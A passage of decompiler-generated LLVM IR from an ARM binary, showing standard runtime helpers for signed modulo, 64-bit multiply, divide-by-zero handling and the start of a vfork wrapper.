  %v5_f2dc = phi i32 [ %v1_f2cc, %bb74 ], [ %v3_f2d8, %.thread67 ], [ %v1_f320.v6_f320.v6_f328.v6_f330, %dec_label_pc_f344 ], [ 0, %bb84 ], [ %v1_f378, %dec_label_pc_f374 ], [ %v2_f374, %bb89 ]
  ret i32 %v5_f2dc

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_f2e4.preheader
  %v0_f2f8.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_f2e4.preheader ], [ %v4_f2ec, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f2e4.preheader ], [ %v2_f2f011, %.thread1.thread9 ]
  br label %dec_label_pc_f2f8thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_f2e4.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_f2f011, %.thread1.thread9 ], [ 0, %dec_label_pc_f2e4.preheader ]
  %v0_f2f8.pr33100 = phi i32 [ %v4_f2ec, %.thread1.thread9 ], [ %arg2, %dec_label_pc_f2e4.preheader ]
  %v4_f2e8 = icmp ult i32 %v0_f2f8.pr33100, %v1_f2cc
  br i1 %v4_f2e8, label %bb78, label %dec_label_pc_f2f8thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_f2ec = and i32 %v0_f2f8.pr33100, 268435456
  %v3_f2ec = icmp eq i32 %v2_f2ec, 0
  %v4_f2ec = mul i32 %v0_f2f8.pr33100, 16
  br i1 %v3_f2ec, label %.thread1.thread9, label %dec_label_pc_f2f8.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_f2f011 = add i32 %storemerge101, 4
  %v2_f2e4 = icmp ugt i32 %v4_f2ec, 268435455
  br i1 %v2_f2e4, label %.thread, label %bb77

dec_label_pc_f2f8thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_f2f8thread-pre-split.loopexit

dec_label_pc_f2f8thread-pre-split.loopexit:       ; preds = %dec_label_pc_f2f8thread-pre-split.loopexit.loopexit, %.thread
  %v0_f2f8.pr3398 = phi i32 [ %v0_f2f8.pr33.lcssa, %.thread ], [ %v0_f2f8.pr33100, %dec_label_pc_f2f8thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_f2f8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f2f8thread-pre-split

dec_label_pc_f2f8thread-pre-split:                ; preds = %.thread4, %dec_label_pc_f2f8thread-pre-split.loopexit
  %v1_f30439 = phi i32 [ %storemerge95, %dec_label_pc_f2f8thread-pre-split.loopexit ], [ %v2_f304, %.thread4 ]
  %v0_f2f8.pr = phi i32 [ %v0_f2f8.pr3398, %dec_label_pc_f2f8thread-pre-split.loopexit ], [ %v3_f300, %.thread4 ]
  br label %dec_label_pc_f2f8

dec_label_pc_f2f8.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_f2f8

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f2f8.loopexit, %dec_label_pc_f2f8thread-pre-split
  %v0_f30c.pr = phi i32 [ %v1_f30439, %dec_label_pc_f2f8thread-pre-split ], [ %storemerge101, %dec_label_pc_f2f8.loopexit ]
  %v1_f300 = phi i32 [ %v0_f2f8.pr, %dec_label_pc_f2f8thread-pre-split ], [ %v4_f2ec, %dec_label_pc_f2f8.loopexit ]
  %v2_f2f8 = icmp slt i32 %v1_f300, 0
  br i1 %v2_f2f8, label %dec_label_pc_f30c, label %bb79

bb79:                                             ; preds = %dec_label_pc_f2f8
  %v4_f2fc = icmp ult i32 %v1_f300, %v1_f2cc
  br i1 %v4_f2fc, label %.thread4, label %dec_label_pc_f30c

.thread4:                                         ; preds = %bb79
  %v3_f300 = mul i32 %v1_f300, 2
  %v2_f304 = add i32 %v0_f30c.pr, 1
  br label %dec_label_pc_f2f8thread-pre-split

dec_label_pc_f30c:                                ; preds = %bb79, %dec_label_pc_f2f8
  %v2_f30c = add i32 %v0_f30c.pr, -3
  %v5_f310 = icmp slt i32 %v0_f30c.pr, 3
  br i1 %v5_f310, label %dec_label_pc_f350, label %dec_label_pc_f314

dec_label_pc_f314:                                ; preds = %dec_label_pc_f30c, %bb83
  %v6_f33c = phi i32 [ %v0_f344, %bb83 ], [ %v2_f30c, %dec_label_pc_f30c ]
  %v1_f318 = phi i32 [ %v1_f320.v6_f320.v6_f328.v6_f330, %bb83 ], [ %v1_f2cc, %dec_label_pc_f30c ]
  %v3_f33812 = phi i32 [ %v3_f338, %bb83 ], [ %v1_f300, %dec_label_pc_f30c ]
  %v3_f314 = icmp ult i32 %v1_f318, %v3_f33812
  %v3_f318 = select i1 %v3_f314, i32 0, i32 %v3_f33812
  %v1_f320 = sub i32 %v1_f318, %v3_f318
  %v4_f31c = udiv i32 %v3_f33812, 2
  %v6_f31c = icmp ult i32 %v1_f320, %v4_f31c
  %v6_f320 = select i1 %v6_f31c, i32 0, i32 %v4_f31c
  %v1_f320.v6_f320 = sub i32 %v1_f320, %v6_f320
  %.demorgan = and i1 %v3_f314, %v6_f31c
  %v4_f324 = udiv i32 %v3_f33812, 4
  %v6_f324 = icmp ult i32 %v1_f320.v6_f320, %v4_f324
  %v6_f328 = select i1 %v6_f324, i32 0, i32 %v4_f324
  %v1_f320.v6_f320.v6_f328 = sub i32 %v1_f320.v6_f320, %v6_f328
  %.demorgan71 = and i1 %.demorgan, %v6_f324
  %v4_f32c = udiv i32 %v3_f33812, 8
  %v6_f32c = icmp ult i32 %v1_f320.v6_f320.v6_f328, %v4_f32c
  %v6_f330 = select i1 %v6_f32c, i32 0, i32 %v4_f32c
  %v1_f320.v6_f320.v6_f328.v6_f330 = sub i32 %v1_f320.v6_f320.v6_f328, %v6_f330
  %.demorgan72 = and i1 %.demorgan71, %v6_f32c
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_f314
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_f314, %bb80
  %v2_f334 = add i32 %v1_f320.v6_f320.v6_f328.v6_f330, -1
  %v4_f334 = sub i32 0, %v1_f320.v6_f320.v6_f328.v6_f330
  %v5_f334 = and i32 %v1_f320.v6_f320.v6_f328.v6_f330, %v4_f334
  %v3_f338 = udiv i32 %v3_f33812, 16
  %v5_f33c = icmp slt i32 %v1_f320.v6_f320.v6_f328.v6_f330, 1
  br i1 %v5_f33c, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_f33c = add i32 %v6_f33c, -4
  %v9_f33c = sub i32 3, %v6_f33c
  %v10_f33c = and i32 %v9_f33c, %v6_f33c
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_f344 = phi i32 [ %v6_f33c, %bb81 ], [ %v7_f33c, %bb82 ]
  %v0_f34015.in = phi i32 [ %v2_f334, %bb81 ], [ %v7_f33c, %bb82 ]
  %v1_f34014.in = phi i32 [ %v5_f334, %bb81 ], [ %v10_f33c, %bb82 ]
  %v1_f34014 = icmp slt i32 %v1_f34014.in, 0
  %v0_f34015 = icmp slt i32 %v0_f34015.in, 0
  %v2_f340 = xor i1 %v0_f34015, %v1_f34014
  br i1 %v2_f340, label %dec_label_pc_f344, label %dec_label_pc_f314

dec_label_pc_f344:                                ; preds = %bb83
  %v1_f344 = urem i32 %v0_f344, 4
  %v2_f344 = icmp eq i32 %v1_f344, 0
  br i1 %v2_f344, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_f344
  %v3_f348 = icmp eq i32 %v1_f320.v6_f320.v6_f328.v6_f330, 0
  br i1 %v3_f348, label %bb76, label %dec_label_pc_f350

dec_label_pc_f350:                                ; preds = %bb84, %dec_label_pc_f30c
  %v0_f364 = phi i32 [ %v3_f338, %bb84 ], [ %v1_f300, %dec_label_pc_f30c ]
  %v1_f360 = phi i32 [ %v1_f320.v6_f320.v6_f328.v6_f330, %bb84 ], [ %v1_f2cc, %dec_label_pc_f30c ]
  %v0_f350 = phi i32 [ %v0_f344, %bb84 ], [ %v2_f30c, %dec_label_pc_f30c ]
  %v5_f354 = icmp slt i32 %v0_f350, -2
  br i1 %v5_f354, label %dec_label_pc_f374, label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f350
  %v8_f350 = icmp eq i32 %v0_f350, -2
  br i1 %v8_f350, label %dec_label_pc_f368, label %dec_label_pc_f35c

dec_label_pc_f35c:                                ; preds = %dec_label_pc_f358
  %v3_f35c = icmp ult i32 %v1_f360, %v0_f364
  br i1 %v3_f35c, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_f35c
  %v2_f35c = sub i32 %v1_f360, %v0_f364
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_f35c, %bb85
  %v0_f36852 = phi i32 [ %v1_f360, %dec_label_pc_f35c ], [ %v2_f35c, %bb85 ]
  %v3_f364 = udiv i32 %v0_f364, 2
  br label %dec_label_pc_f368

dec_label_pc_f368:                                ; preds = %dec_label_pc_f358, %bb86
  %v0_f370 = phi i32 [ %v0_f364, %dec_label_pc_f358 ], [ %v3_f364, %bb86 ]
  %v1_f36c = phi i32 [ %v1_f360, %dec_label_pc_f358 ], [ %v0_f36852, %bb86 ]
  %v3_f368 = icmp ult i32 %v1_f36c, %v0_f370
  br i1 %v3_f368, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_f368
  %v2_f368 = sub i32 %v1_f36c, %v0_f370
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_f368, %bb87
  %v0_f37455 = phi i32 [ %v1_f36c, %dec_label_pc_f368 ], [ %v2_f368, %bb87 ]
  %v3_f370 = udiv i32 %v0_f370, 2
  br label %dec_label_pc_f374

dec_label_pc_f374:                                ; preds = %dec_label_pc_f350, %bb88
  %v2_f378 = phi i32 [ %v0_f364, %dec_label_pc_f350 ], [ %v3_f370, %bb88 ]
  %v1_f378 = phi i32 [ %v1_f360, %dec_label_pc_f350 ], [ %v0_f37455, %bb88 ]
  %v3_f374 = icmp ult i32 %v1_f378, %v2_f378
  br i1 %v3_f374, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_f374
  %v2_f374 = sub i32 %v1_f378, %v2_f378
  br label %bb76

dec_label_pc_f380:                                ; preds = %entry
  %v0_f380 = load i32, i32* @lr, align 4
  %v0_f384 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f380)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_f378, { 1, 2, 0 }
  uselistorder i32 %v0_f364, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f344, { 1, 0, 2 }
  uselistorder i32 %v7_f33c, { 1, 0 }
  uselistorder i32 %v3_f338, { 1, 0 }
  uselistorder i32 %v1_f320.v6_f320.v6_f328.v6_f330, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_f32c, { 1, 0 }
  uselistorder i32 %v4_f324, { 1, 0 }
  uselistorder i32 %v4_f31c, { 1, 0 }
  uselistorder i32 %v6_f33c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f30c, { 1, 0 }
  uselistorder i32 %v1_f300, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_f2ec, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f2f8.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f2cc, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_f374, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_f368, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_f314, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_f390 = icmp eq i32 %arg2, 0
  br i1 %v2_f390, label %dec_label_pc_f464, label %dec_label_pc_f398

dec_label_pc_f398:                                ; preds = %entry
  %v1_f390 = icmp slt i32 %arg2, 0
  br i1 %v1_f390, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_f398
  %v2_f398 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_f398, %bb
  %v4_f3b0 = phi i32 [ %arg2, %dec_label_pc_f398 ], [ %v2_f398, %bb ]
  %v0_f39c = load i32, i32* @r0, align 4
  %v1_f39c = icmp slt i32 %v0_f39c, 0
  br i1 %v1_f39c, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_f3a0 = sub i32 0, %v0_f39c
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_f3a8 = phi i32 [ %v0_f39c, %bb79 ], [ %v2_f3a0, %bb80 ]
  %v1_f3a4 = add i32 %v4_f3b0, -1
  %v7_f3a4 = icmp eq i32 %v4_f3b0, 1
  br i1 %v7_f3a4, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_f3a8 = icmp eq i32 %v1_f3a8, %v4_f3b0
  br i1 %v10_f3a8, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_f3a8 = icmp ult i32 %v1_f3a8, %v4_f3b0
  br i1 %v4_f3a8, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_f3b0 = and i32 %v1_f3a4, %v4_f3b0
  %v8_f3b0 = icmp eq i32 %v6_f3b0, 0
  br i1 %v8_f3b0, label %.thread72, label %dec_label_pc_f3c0.preheader

dec_label_pc_f3c0.preheader:                      ; preds = %bb84
  %v2_f3c0109 = icmp ugt i32 %v4_f3b0, 268435455
  br i1 %v2_f3c0109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_f3b464 = phi i32 [ %v1_f3a8, %bb84 ], [ 0, %.thread70 ]
  %v3_f3b4 = and i32 %v1_f3b464, %v1_f3a4
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_f3c0.preheader
  %v0_f3d4.pr35.lcssa = phi i32 [ %v4_f3b0, %dec_label_pc_f3c0.preheader ], [ %v4_f3c8, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f3c0.preheader ], [ %v2_f3cc9, %.thread2.thread7 ]
  br label %dec_label_pc_f3d4thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_f3c0.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_f3cc9, %.thread2.thread7 ], [ 0, %dec_label_pc_f3c0.preheader ]
  %v0_f3d4.pr35110 = phi i32 [ %v4_f3c8, %.thread2.thread7 ], [ %v4_f3b0, %dec_label_pc_f3c0.preheader ]
  %v4_f3c4 = icmp ult i32 %v0_f3d4.pr35110, %v1_f3a8
  br i1 %v4_f3c4, label %bb86, label %dec_label_pc_f3d4thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_f3c8 = and i32 %v0_f3d4.pr35110, 268435456
  %v3_f3c8 = icmp eq i32 %v2_f3c8, 0
  %v4_f3c8 = mul i32 %v0_f3d4.pr35110, 16
  br i1 %v3_f3c8, label %.thread2.thread7, label %dec_label_pc_f3d4.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_f3cc9 = add i32 %storemerge111, 4
  %v2_f3c0 = icmp ugt i32 %v4_f3c8, 268435455
  br i1 %v2_f3c0, label %.thread1, label %bb85

dec_label_pc_f3d4thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_f3d4thread-pre-split.loopexit

dec_label_pc_f3d4thread-pre-split.loopexit:       ; preds = %dec_label_pc_f3d4thread-pre-split.loopexit.loopexit, %.thread1
  %v0_f3d4.pr35108 = phi i32 [ %v0_f3d4.pr35.lcssa, %.thread1 ], [ %v0_f3d4.pr35110, %dec_label_pc_f3d4thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_f3d4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f3d4thread-pre-split

dec_label_pc_f3d4thread-pre-split:                ; preds = %.thread4, %dec_label_pc_f3d4thread-pre-split.loopexit
  %v1_f3e041 = phi i32 [ %storemerge105, %dec_label_pc_f3d4thread-pre-split.loopexit ], [ %v2_f3e0, %.thread4 ]
  %v2_f3d836 = phi i32 [ %v1_f3a8, %dec_label_pc_f3d4thread-pre-split.loopexit ], [ %v2_f3d8, %.thread4 ]
  %v0_f3d4.pr = phi i32 [ %v0_f3d4.pr35108, %dec_label_pc_f3d4thread-pre-split.loopexit ], [ %v3_f3dc, %.thread4 ]
  br label %dec_label_pc_f3d4

dec_label_pc_f3d4.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_f3d4

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3d4.loopexit, %dec_label_pc_f3d4thread-pre-split
  %v0_f3e8.pr = phi i32 [ %v1_f3e041, %dec_label_pc_f3d4thread-pre-split ], [ %storemerge111, %dec_label_pc_f3d4.loopexit ]
  %v2_f3d8 = phi i32 [ %v2_f3d836, %dec_label_pc_f3d4thread-pre-split ], [ %v1_f3a8, %dec_label_pc_f3d4.loopexit ]
  %v1_f3dc = phi i32 [ %v0_f3d4.pr, %dec_label_pc_f3d4thread-pre-split ], [ %v4_f3c8, %dec_label_pc_f3d4.loopexit ]
  %v2_f3d4 = icmp slt i32 %v1_f3dc, 0
  br i1 %v2_f3d4, label %dec_label_pc_f3e8, label %bb87

bb87:                                             ; preds = %dec_label_pc_f3d4
  %v4_f3d8 = icmp ult i32 %v1_f3dc, %v2_f3d8
  br i1 %v4_f3d8, label %.thread4, label %dec_label_pc_f3e8

.thread4:                                         ; preds = %bb87
  %v3_f3dc = mul i32 %v1_f3dc, 2
  %v2_f3e0 = add i32 %v0_f3e8.pr, 1
  br label %dec_label_pc_f3d4thread-pre-split

dec_label_pc_f3e8:                                ; preds = %bb87, %dec_label_pc_f3d4
  %v2_f3e8 = add i32 %v0_f3e8.pr, -3
  %v5_f3ec = icmp slt i32 %v0_f3e8.pr, 3
  br i1 %v5_f3ec, label %dec_label_pc_f42c, label %dec_label_pc_f3f0

dec_label_pc_f3f0:                                ; preds = %dec_label_pc_f3e8, %bb91
  %v6_f418 = phi i32 [ %v0_f420, %bb91 ], [ %v2_f3e8, %dec_label_pc_f3e8 ]
  %v1_f3f4 = phi i32 [ %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, %bb91 ], [ %v2_f3d8, %dec_label_pc_f3e8 ]
  %v3_f41410 = phi i32 [ %v3_f414, %bb91 ], [ %v1_f3dc, %dec_label_pc_f3e8 ]
  %v3_f3f0 = icmp ult i32 %v1_f3f4, %v3_f41410
  %v3_f3f4 = select i1 %v3_f3f0, i32 0, i32 %v3_f41410
  %v1_f3fc = sub i32 %v1_f3f4, %v3_f3f4
  %v4_f3f8 = udiv i32 %v3_f41410, 2
  %v6_f3f8 = icmp ult i32 %v1_f3fc, %v4_f3f8
  %v6_f3fc = select i1 %v6_f3f8, i32 0, i32 %v4_f3f8
  %v1_f3fc.v6_f3fc = sub i32 %v1_f3fc, %v6_f3fc
  %.demorgan = and i1 %v3_f3f0, %v6_f3f8
  %v4_f400 = udiv i32 %v3_f41410, 4
  %v6_f400 = icmp ult i32 %v1_f3fc.v6_f3fc, %v4_f400
  %v6_f404 = select i1 %v6_f400, i32 0, i32 %v4_f400
  %v1_f3fc.v6_f3fc.v6_f404 = sub i32 %v1_f3fc.v6_f3fc, %v6_f404
  %.demorgan76 = and i1 %.demorgan, %v6_f400
  %v4_f408 = udiv i32 %v3_f41410, 8
  %v6_f408 = icmp ult i32 %v1_f3fc.v6_f3fc.v6_f404, %v4_f408
  %v6_f40c = select i1 %v6_f408, i32 0, i32 %v4_f408
  %v1_f3fc.v6_f3fc.v6_f404.v6_f40c = sub i32 %v1_f3fc.v6_f3fc.v6_f404, %v6_f40c
  %.demorgan77 = and i1 %.demorgan76, %v6_f408
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_f3f0
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_f3f0, %bb88
  %v2_f410 = add i32 %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, -1
  %v4_f410 = sub i32 0, %v1_f3fc.v6_f3fc.v6_f404.v6_f40c
  %v5_f410 = and i32 %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, %v4_f410
  %v3_f414 = udiv i32 %v3_f41410, 16
  %v5_f418 = icmp slt i32 %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, 1
  br i1 %v5_f418, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_f418 = add i32 %v6_f418, -4
  %v9_f418 = sub i32 3, %v6_f418
  %v10_f418 = and i32 %v9_f418, %v6_f418
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_f420 = phi i32 [ %v6_f418, %bb89 ], [ %v7_f418, %bb90 ]
  %v0_f41c13.in = phi i32 [ %v2_f410, %bb89 ], [ %v7_f418, %bb90 ]
  %v1_f41c12.in = phi i32 [ %v5_f410, %bb89 ], [ %v10_f418, %bb90 ]
  %v1_f41c12 = icmp slt i32 %v1_f41c12.in, 0
  %v0_f41c13 = icmp slt i32 %v0_f41c13.in, 0
  %v2_f41c = xor i1 %v0_f41c13, %v1_f41c12
  br i1 %v2_f41c, label %dec_label_pc_f420, label %dec_label_pc_f3f0

dec_label_pc_f420:                                ; preds = %bb91
  %v1_f420 = urem i32 %v0_f420, 4
  %v2_f420 = icmp eq i32 %v1_f420, 0
  br i1 %v2_f420, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_f420
  %v3_f424 = icmp eq i32 %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, 0
  br i1 %v3_f424, label %.thread6, label %dec_label_pc_f42c

dec_label_pc_f42c:                                ; preds = %bb92, %dec_label_pc_f3e8
  %v0_f440 = phi i32 [ %v3_f414, %bb92 ], [ %v1_f3dc, %dec_label_pc_f3e8 ]
  %v1_f43c = phi i32 [ %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, %bb92 ], [ %v2_f3d8, %dec_label_pc_f3e8 ]
  %v0_f42c = phi i32 [ %v0_f420, %bb92 ], [ %v2_f3e8, %dec_label_pc_f3e8 ]
  %v5_f430 = icmp slt i32 %v0_f42c, -2
  br i1 %v5_f430, label %dec_label_pc_f450, label %dec_label_pc_f434

dec_label_pc_f434:                                ; preds = %dec_label_pc_f42c
  %v8_f42c = icmp eq i32 %v0_f42c, -2
  br i1 %v8_f42c, label %dec_label_pc_f444, label %dec_label_pc_f438

dec_label_pc_f438:                                ; preds = %dec_label_pc_f434
  %v3_f438 = icmp ult i32 %v1_f43c, %v0_f440
  br i1 %v3_f438, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_f438
  %v2_f438 = sub i32 %v1_f43c, %v0_f440
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_f438, %bb93
  %v0_f44454 = phi i32 [ %v1_f43c, %dec_label_pc_f438 ], [ %v2_f438, %bb93 ]
  %v3_f440 = udiv i32 %v0_f440, 2
  br label %dec_label_pc_f444

dec_label_pc_f444:                                ; preds = %dec_label_pc_f434, %bb94
  %v0_f44c = phi i32 [ %v0_f440, %dec_label_pc_f434 ], [ %v3_f440, %bb94 ]
  %v1_f448 = phi i32 [ %v1_f43c, %dec_label_pc_f434 ], [ %v0_f44454, %bb94 ]
  %v3_f444 = icmp ult i32 %v1_f448, %v0_f44c
  br i1 %v3_f444, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_f444
  %v2_f444 = sub i32 %v1_f448, %v0_f44c
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_f444, %bb95
  %v0_f45057 = phi i32 [ %v1_f448, %dec_label_pc_f444 ], [ %v2_f444, %bb95 ]
  %v3_f44c = udiv i32 %v0_f44c, 2
  br label %dec_label_pc_f450

dec_label_pc_f450:                                ; preds = %dec_label_pc_f42c, %bb96
  %v2_f454 = phi i32 [ %v0_f440, %dec_label_pc_f42c ], [ %v3_f44c, %bb96 ]
  %v1_f454 = phi i32 [ %v1_f43c, %dec_label_pc_f42c ], [ %v0_f45057, %bb96 ]
  %v3_f450 = icmp ult i32 %v1_f454, %v2_f454
  br i1 %v3_f450, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_f450
  %v2_f450 = sub i32 %v1_f454, %v2_f454
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_f450, %bb83, %.thread72, %dec_label_pc_f420, %bb92, %bb97
  %v1_f45c = phi i32 [ %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, %dec_label_pc_f420 ], [ 0, %bb92 ], [ %v1_f454, %dec_label_pc_f450 ], [ %v2_f450, %bb97 ], [ %v3_f3b4, %.thread72 ], [ %v1_f3a8, %bb83 ]
  br i1 %v1_f39c, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_f45c = sub i32 0, %v1_f45c
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_f460 = phi i32 [ %v1_f45c, %.thread6 ], [ %v2_f45c, %bb98 ]
  ret i32 %v1_f460

dec_label_pc_f464:                                ; preds = %entry
  %v0_f464 = load i32, i32* @lr, align 4
  %v0_f468 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f464)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_f440, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f420, { 1, 0, 2 }
  uselistorder i32 %v7_f418, { 1, 0 }
  uselistorder i32 %v3_f414, { 1, 0 }
  uselistorder i32 %v1_f3fc.v6_f3fc.v6_f404.v6_f40c, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_f408, { 1, 0 }
  uselistorder i32 %v4_f400, { 1, 0 }
  uselistorder i32 %v4_f3f8, { 1, 0 }
  uselistorder i32 %v6_f418, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f3e8, { 1, 0 }
  uselistorder i32 %v1_f3dc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_f3d8, { 1, 0, 3, 2 }
  uselistorder i32 %v4_f3c8, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f3d4.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f3a8, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_f3b0, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_f450, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_f444, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_f3f0, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_f474 = load i32, i32* @r0, align 4
  ret i32 %v1_f474
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_f484 = udiv i32 %arg1, 65536
  %v3_f488 = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_f484, -65536
  %v5_f48c = add i32 %tmp, -1
  %v6_f48c = and i32 %v5_f48c, %arg1
  %tmp10 = mul i32 %v3_f488, -65536
  %v5_f490 = add i32 %tmp10, -1
  %v6_f490 = and i32 %v5_f490, %arg3
  %v2_f494 = mul i32 %v6_f490, %v6_f48c
  %v2_f498 = mul i32 %v6_f490, %v3_f484
  %v2_f49c = mul i32 %v6_f48c, %v3_f488
  %v2_f4a4 = add i32 %v2_f498, %v2_f49c
  %v3_f4a4 = icmp ult i32 %v2_f4a4, %v2_f498
  br i1 %v3_f4a4, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_f4ac = mul i32 %v2_f4a4, 65536
  %v5_f4ac = add i32 %v4_f4ac, %v2_f494
  ret i32 %v5_f4ac

; uselistorder directives
  uselistorder i32 %v2_f498, { 1, 0 }
  uselistorder i32 %v6_f48c, { 1, 0 }
  uselistorder i32 %v3_f488, { 1, 0 }
  uselistorder i32 %v3_f484, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_f4c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f4c8:
  ret i32 %arg1
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_f4d0 = call i32 @vfork()
  store i32 %v0_f4d0, i32* @r0, align 4
  %v2_f4d4 = icmp ugt i32 %v0_f4d0, -4097
  br i1 %v2_f4d4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_f4e8, %entry
  %merge = phi i32 [ %v0_f4d0, %entry ], [ %v0_f4e8, %dec_label_pc_f4e8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_f4e0 = icmp eq i32 %v0_f4d0, -38
